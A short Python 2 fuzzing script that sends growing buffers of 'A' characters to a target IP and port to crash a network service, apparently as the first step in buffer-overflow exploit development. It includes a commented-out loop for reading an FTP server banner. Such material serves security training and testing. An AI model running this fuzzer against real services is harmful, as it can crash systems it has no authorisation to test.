import socket


target = '192.168.1.6' #change this
port = 9999	#change this

# buffer for crash
buf = ['A']
counter = 100
while len(buf) <= 30:
	buf.append('A'*counter)
	counter += 200

for string in buf:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		s.connect((target,port))
		data = s.recv(1024)
		print data
	except Exception, e:
		print e

	print 'Fuzzing with %s bytes' %len(string)
	s.send(string + '\r')  #change this to suite the program you're attacking
	data = s.recv(1024)
	s.close()


#if having socket problems with recv use this to get all response
'''data = ''
	while True:
		data +=s.recv(1024)
		if '220 Please visit http://sourceforge.net/projects/filezilla/' in data:
			break
	print data'''

